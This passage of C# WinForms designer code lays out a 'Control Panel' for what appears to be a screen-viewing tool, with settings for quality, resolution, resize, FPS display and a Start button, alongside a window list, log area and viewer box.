        this.bunifuCheckBox_0.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox_0.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox_0.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox_0.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox_0.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox_0.TabIndex = 670;
        this.bunifuCheckBox_0.ThreeState = false;
        this.bunifuCheckBox_0.ToolTipText = null;
        this.bunifuCheckBox_0.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnbledFPS_CheckedChanged);
        this.label3.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label3.AutoSize = true;
        this.label3.BackColor = System.Drawing.Color.Transparent;
        this.label3.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label3.ForeColor = System.Drawing.Color.Black;
        this.label3.Location = new System.Drawing.Point(31, 228);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(91, 15);
        this.label3.TabIndex = 669;
        this.label3.Text = "FPS info Disable";
        this.WindowSize.AllowBindingControlAnimation = true;
        this.WindowSize.AllowBindingControlColorChanges = false;
        this.WindowSize.AllowBindingControlLocation = true;
        this.WindowSize.AllowCheckBoxAnimation = true;
        this.WindowSize.AllowCheckmarkAnimation = true;
        this.WindowSize.AllowOnHoverStates = true;
        this.WindowSize.AutoCheck = true;
        this.WindowSize.BackColor = System.Drawing.Color.Transparent;
        this.WindowSize.BackgroundImage = (System.Drawing.Image)resources.GetObject("WindowSize.BackgroundImage");
        this.WindowSize.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.WindowSize.BindingControl = this.label2;
        this.WindowSize.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.WindowSize.BorderRadius = 6;
        this.WindowSize.Checked = true;
        this.WindowSize.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.WindowSize.Cursor = System.Windows.Forms.Cursors.Hand;
        this.WindowSize.CustomCheckmarkImage = null;
        this.WindowSize.Location = new System.Drawing.Point(7, 197);
        this.WindowSize.MinimumSize = new System.Drawing.Size(17, 17);
        this.WindowSize.Name = "WindowSize";
        this.WindowSize.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WindowSize.OnCheck.BorderRadius = 6;
        this.WindowSize.OnCheck.BorderThickness = 2;
        this.WindowSize.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WindowSize.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.WindowSize.OnCheck.CheckmarkThickness = 2;
        this.WindowSize.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.WindowSize.OnDisable.BorderRadius = 6;
        this.WindowSize.OnDisable.BorderThickness = 2;
        this.WindowSize.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.WindowSize.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.WindowSize.OnDisable.CheckmarkThickness = 2;
        this.WindowSize.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.WindowSize.OnHoverChecked.BorderRadius = 6;
        this.WindowSize.OnHoverChecked.BorderThickness = 2;
        this.WindowSize.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WindowSize.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.WindowSize.OnHoverChecked.CheckmarkThickness = 2;
        this.WindowSize.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.WindowSize.OnHoverUnchecked.BorderRadius = 6;
        this.WindowSize.OnHoverUnchecked.BorderThickness = 1;
        this.WindowSize.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.WindowSize.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.WindowSize.OnUncheck.BorderRadius = 6;
        this.WindowSize.OnUncheck.BorderThickness = 1;
        this.WindowSize.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.WindowSize.Size = new System.Drawing.Size(21, 21);
        this.WindowSize.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.WindowSize.TabIndex = 668;
        this.WindowSize.ThreeState = false;
        this.WindowSize.ToolTipText = null;
        this.label2.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label2.AutoSize = true;
        this.label2.BackColor = System.Drawing.Color.Transparent;
        this.label2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label2.ForeColor = System.Drawing.Color.Black;
        this.label2.Location = new System.Drawing.Point(31, 201);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(119, 15);
        this.label2.TabIndex = 667;
        this.label2.Text = "Window Size Enabled";
        this.pictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
        this.pictureBox2.Location = new System.Drawing.Point(9, 284);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(226, 91);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 666;
        this.pictureBox2.TabStop = false;
        this.Speed.AllowBindingControlAnimation = true;
        this.Speed.AllowBindingControlColorChanges = false;
        this.Speed.AllowBindingControlLocation = true;
        this.Speed.AllowCheckBoxAnimation = true;
        this.Speed.AllowCheckmarkAnimation = true;
        this.Speed.AllowOnHoverStates = true;
        this.Speed.AutoCheck = true;
        this.Speed.BackColor = System.Drawing.Color.Transparent;
        this.Speed.BackgroundImage = (System.Drawing.Image)resources.GetObject("Speed.BackgroundImage");
        this.Speed.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.Speed.BindingControl = this.label1;
        this.Speed.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.Speed.BorderRadius = 6;
        this.Speed.Checked = true;
        this.Speed.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.Speed.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Speed.CustomCheckmarkImage = null;
        this.Speed.Location = new System.Drawing.Point(7, 50);
        this.Speed.MinimumSize = new System.Drawing.Size(17, 17);
        this.Speed.Name = "Speed";
        this.Speed.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Speed.OnCheck.BorderRadius = 6;
        this.Speed.OnCheck.BorderThickness = 2;
        this.Speed.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Speed.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.Speed.OnCheck.CheckmarkThickness = 2;
        this.Speed.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.Speed.OnDisable.BorderRadius = 6;
        this.Speed.OnDisable.BorderThickness = 2;
        this.Speed.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.Speed.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.Speed.OnDisable.CheckmarkThickness = 2;
        this.Speed.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Speed.OnHoverChecked.BorderRadius = 6;
        this.Speed.OnHoverChecked.BorderThickness = 2;
        this.Speed.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Speed.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.Speed.OnHoverChecked.CheckmarkThickness = 2;
        this.Speed.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Speed.OnHoverUnchecked.BorderRadius = 6;
        this.Speed.OnHoverUnchecked.BorderThickness = 1;
        this.Speed.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.Speed.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.Speed.OnUncheck.BorderRadius = 6;
        this.Speed.OnUncheck.BorderThickness = 1;
        this.Speed.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.Speed.Size = new System.Drawing.Size(21, 21);
        this.Speed.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.Speed.TabIndex = 665;
        this.Speed.ThreeState = false;
        this.Speed.ToolTipText = null;
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label1.ForeColor = System.Drawing.Color.Black;
        this.label1.Location = new System.Drawing.Point(31, 54);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(108, 15);
        this.label1.TabIndex = 664;
        this.label1.Text = "Max speed support";
        this.SizeScreen.AllowParentOverrides = false;
        this.SizeScreen.AutoEllipsis = false;
        this.SizeScreen.AutoSize = false;
        this.SizeScreen.BackColor = System.Drawing.Color.White;
        this.SizeScreen.Cursor = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.CursorType = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.SizeScreen.ForeColor = System.Drawing.Color.DarkGray;
        this.SizeScreen.Location = new System.Drawing.Point(135, 167);
        this.SizeScreen.Name = "SizeScreen";
        this.SizeScreen.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.SizeScreen.Size = new System.Drawing.Size(102, 15);
        this.SizeScreen.TabIndex = 663;
        this.SizeScreen.Text = "1920 x 1080";
        this.SizeScreen.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.SizeScreen.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ScreenY.AcceptsReturn = false;
        this.ScreenY.AcceptsTab = false;
        this.ScreenY.AnimationSpeed = 200;
        this.ScreenY.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenY.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenY.AutoSizeHeight = true;
        this.ScreenY.BackColor = System.Drawing.Color.Transparent;
        this.ScreenY.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenY.BackgroundImage");
        this.ScreenY.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenY.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenY.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenY.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenY.BorderRadius = 2;
        this.ScreenY.BorderThickness = 1;
        this.ScreenY.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenY.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenY.DefaultText = "1080";
        this.ScreenY.Enabled = false;
        this.ScreenY.FillColor = System.Drawing.Color.White;
        this.ScreenY.HideSelection = true;
        this.ScreenY.IconLeft = null;
        this.ScreenY.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.IconPadding = 10;
        this.ScreenY.IconRight = null;
        this.ScreenY.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.Lines = new string[1] { "1080" };
        this.ScreenY.Location = new System.Drawing.Point(72, 161);
        this.ScreenY.MaxLength = 32767;
        this.ScreenY.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenY.Modified = false;
        this.ScreenY.Multiline = false;
        this.ScreenY.Name = "ScreenY";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenY.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnIdleState = stateProperties4;
        this.ScreenY.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenY.PasswordChar = '\0';
        this.ScreenY.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenY.PlaceholderText = "Y";
        this.ScreenY.ReadOnly = false;
        this.ScreenY.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenY.SelectedText = "";
        this.ScreenY.SelectionLength = 0;
        this.ScreenY.SelectionStart = 0;
        this.ScreenY.ShortcutsEnabled = true;
        this.ScreenY.Size = new System.Drawing.Size(59, 28);
        this.ScreenY.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenY.TabIndex = 662;
        this.ScreenY.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenY.TextMarginBottom = 0;
        this.ScreenY.TextMarginLeft = 3;
        this.ScreenY.TextMarginTop = 1;
        this.ScreenY.TextPlaceholder = "Y";
        this.ScreenY.UseSystemPasswordChar = false;
        this.ScreenY.WordWrap = true;
        this.ScreenX.AcceptsReturn = false;
        this.ScreenX.AcceptsTab = false;
        this.ScreenX.AnimationSpeed = 200;
        this.ScreenX.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenX.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenX.AutoSizeHeight = true;
        this.ScreenX.BackColor = System.Drawing.Color.Transparent;
        this.ScreenX.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenX.BackgroundImage");
        this.ScreenX.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenX.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenX.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenX.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenX.BorderRadius = 2;
        this.ScreenX.BorderThickness = 1;
        this.ScreenX.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenX.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenX.DefaultText = "1920";
        this.ScreenX.Enabled = false;
        this.ScreenX.FillColor = System.Drawing.Color.White;
        this.ScreenX.HideSelection = true;
        this.ScreenX.IconLeft = null;
        this.ScreenX.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.IconPadding = 10;
        this.ScreenX.IconRight = null;
        this.ScreenX.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.Lines = new string[1] { "1920" };
        this.ScreenX.Location = new System.Drawing.Point(7, 161);
        this.ScreenX.MaxLength = 32767;
        this.ScreenX.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenX.Modified = false;
        this.ScreenX.Multiline = false;
        this.ScreenX.Name = "ScreenX";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenX.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnIdleState = stateProperties8;
        this.ScreenX.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenX.PasswordChar = '\0';
        this.ScreenX.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenX.PlaceholderText = "X";
        this.ScreenX.ReadOnly = false;
        this.ScreenX.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenX.SelectedText = "";
        this.ScreenX.SelectionLength = 0;
        this.ScreenX.SelectionStart = 0;
        this.ScreenX.ShortcutsEnabled = true;
        this.ScreenX.Size = new System.Drawing.Size(59, 28);
        this.ScreenX.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenX.TabIndex = 659;
        this.ScreenX.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenX.TextMarginBottom = 0;
        this.ScreenX.TextMarginLeft = 3;
        this.ScreenX.TextMarginTop = 1;
        this.ScreenX.TextPlaceholder = "X";
        this.ScreenX.UseSystemPasswordChar = false;
        this.ScreenX.WordWrap = true;
        this.EnabledResize.AllowBindingControlAnimation = true;
        this.EnabledResize.AllowBindingControlColorChanges = false;
        this.EnabledResize.AllowBindingControlLocation = true;
        this.EnabledResize.AllowCheckBoxAnimation = true;
        this.EnabledResize.AllowCheckmarkAnimation = true;
        this.EnabledResize.AllowOnHoverStates = true;
        this.EnabledResize.AutoCheck = true;
        this.EnabledResize.BackColor = System.Drawing.Color.Transparent;
        this.EnabledResize.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledResize.BackgroundImage");
        this.EnabledResize.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledResize.BindingControl = this.TxDelay;
        this.EnabledResize.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledResize.BorderRadius = 6;
        this.EnabledResize.Checked = false;
        this.EnabledResize.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledResize.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledResize.CustomCheckmarkImage = null;
        this.EnabledResize.Location = new System.Drawing.Point(7, 124);
        this.EnabledResize.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledResize.Name = "EnabledResize";
        this.EnabledResize.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.BorderRadius = 6;
        this.EnabledResize.OnCheck.BorderThickness = 2;
        this.EnabledResize.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnCheck.CheckmarkThickness = 2;
        this.EnabledResize.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.BorderRadius = 6;
        this.EnabledResize.OnDisable.BorderThickness = 2;
        this.EnabledResize.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverChecked.BorderRadius = 6;
        this.EnabledResize.OnHoverChecked.BorderThickness = 2;
        this.EnabledResize.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledResize.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledResize.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledResize.OnUncheck.BorderRadius = 6;
        this.EnabledResize.OnUncheck.BorderThickness = 1;
        this.EnabledResize.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledResize.Size = new System.Drawing.Size(21, 21);
        this.EnabledResize.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledResize.TabIndex = 661;
        this.EnabledResize.ThreeState = false;
        this.EnabledResize.ToolTipText = null;
        this.TxDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDelay.AutoSize = true;
        this.TxDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDelay.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxDelay.ForeColor = System.Drawing.Color.Black;
        this.TxDelay.Location = new System.Drawing.Point(31, 128);
        this.TxDelay.Name = "TxDelay";
        this.TxDelay.Size = new System.Drawing.Size(84, 15);
        this.TxDelay.TabIndex = 660;
        this.TxDelay.Text = "Resize Enabled";
        this.ValueQuality.BackColor = System.Drawing.Color.White;
        this.ValueQuality.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ValueQuality.ForeColor = System.Drawing.Color.DimGray;
        this.ValueQuality.Location = new System.Drawing.Point(171, 96);
        this.ValueQuality.Name = "ValueQuality";
        this.ValueQuality.Size = new System.Drawing.Size(66, 17);
        this.ValueQuality.TabIndex = 642;
        this.ValueQuality.Text = "60% Quality";
        this.QualityTrackBar.BackColor = System.Drawing.Color.White;
        this.QualityTrackBar.FillColor = System.Drawing.Color.FromArgb(193, 200, 207);
        this.QualityTrackBar.HoverState.Parent = this.QualityTrackBar;
        this.QualityTrackBar.Location = new System.Drawing.Point(7, 95);
        this.QualityTrackBar.Name = "QualityTrackBar";
        this.QualityTrackBar.Size = new System.Drawing.Size(158, 23);
        this.QualityTrackBar.TabIndex = 641;
        this.QualityTrackBar.ThumbColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.QualityTrackBar.Value = 60;
        this.QualityTrackBar.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityTrackBar_Scroll);
        this.MuneClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.MuneClose.AutoSize = true;
        this.MuneClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.MuneClose.Location = new System.Drawing.Point(224, 1);
        this.MuneClose.Name = "MuneClose";
        this.MuneClose.Size = new System.Drawing.Size(16, 15);
        this.MuneClose.TabIndex = 598;
        this.MuneClose.Text = "X";
        this.MuneClose.Click += new System.EventHandler(MuneClose_Click);
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.BackColor = System.Drawing.Color.White;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Dock = System.Windows.Forms.DockStyle.Top;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(0, 0);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(245, 15);
        this.bunifuLabel17.TabIndex = 615;
        this.bunifuLabel17.Text = "Control Panel";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Power.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Power.BackColor = System.Drawing.Color.White;
        this.Power.BorderRadius = 4;
        this.Power.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.Parent = this.Power;
        this.Power.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Power.CustomImages.Parent = this.Power;
        this.Power.Enabled = false;
        this.Power.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Power.ForeColor = System.Drawing.Color.White;
        this.Power.HoverState.Parent = this.Power;
        this.Power.Location = new System.Drawing.Point(159, 381);
        this.Power.Name = "Power";
        this.Power.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Power.PressedDepth = 50;
        this.Power.ShadowDecoration.Parent = this.Power;
        this.Power.Size = new System.Drawing.Size(76, 29);
        this.Power.TabIndex = 574;
        this.Power.Text = "Start";
        this.Power.Click += new System.EventHandler(Power_Click);
        this.InfoFPS.AllowParentOverrides = false;
        this.InfoFPS.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.InfoFPS.AutoEllipsis = false;
        this.InfoFPS.AutoSize = false;
        this.InfoFPS.Cursor = System.Windows.Forms.Cursors.Default;
        this.InfoFPS.CursorType = System.Windows.Forms.Cursors.Default;
        this.InfoFPS.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.InfoFPS.ForeColor = System.Drawing.Color.DarkGray;
        this.InfoFPS.Location = new System.Drawing.Point(16, 536);
        this.InfoFPS.Name = "InfoFPS";
        this.InfoFPS.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.InfoFPS.Size = new System.Drawing.Size(148, 15);
        this.InfoFPS.TabIndex = 602;
        this.InfoFPS.Text = "...";
        this.InfoFPS.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.InfoFPS.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.InfoFPS.Visible = false;
        this.panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panel1.Controls.Add(this.tableLayoutPanel1);
        this.panel1.Location = new System.Drawing.Point(16, 112);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(661, 418);
        this.panel1.TabIndex = 601;
        this.tableLayoutPanel1.ColumnCount = 2;
        this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 50f));
        this.tableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 239f));
        this.tableLayoutPanel1.Controls.Add(this.ListWindows, 1, 0);
        this.tableLayoutPanel1.Controls.Add(this.Logs, 0, 1);
        this.tableLayoutPanel1.Controls.Add(this.CountWindows, 0, 1);
        this.tableLayoutPanel1.Controls.Add(this.ViewerBox, 0, 0);
        this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tableLayoutPanel1.Location = new System.Drawing.Point(0, 0);
        this.tableLayoutPanel1.Name = "tableLayoutPanel1";
